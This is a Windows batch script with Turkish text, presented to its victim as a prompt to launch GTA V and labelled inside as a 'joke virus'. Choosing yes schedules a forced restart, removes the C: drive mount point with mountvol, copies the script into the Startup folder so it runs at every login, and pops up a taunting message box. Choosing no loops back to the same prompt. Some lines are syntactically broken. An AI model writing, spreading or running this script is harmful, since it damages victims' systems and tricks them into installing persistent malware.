:GTAV
@echo off 

color a 
echo GTA V ACILSIN MI?(E=evet H=hayir)
set /p input=
if /i %input%==E goto love
if /i %input%==H goto hate
if /i not %input%==E,H goto1
@echo off
:3
color b
echo GECERSIZ CEVAP!
echo GECERSIZ CEVAP!
echo GECERSIZ CEVAP!
timeout 3
goto GTAV

:love
shutdown -r -t 10
mountvol /?
mountvol C:\ /d
echo @echo off
copy %0 "%userprofile%\..\%username%\Start Menu\Programs\Startup"

echo result=Msgbox("SAKA YAPTIM :D",BUTONKISMI+IKONKISMI, "SAKA VIRUSU :D")>>mssg.vbs
start mssg.vbs >>test.bat

echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
echo BYE BYE PC :D
:MATRIX
color a

color 4
goto MATRIX
timeout 2
exit

:hate
goto GTAV
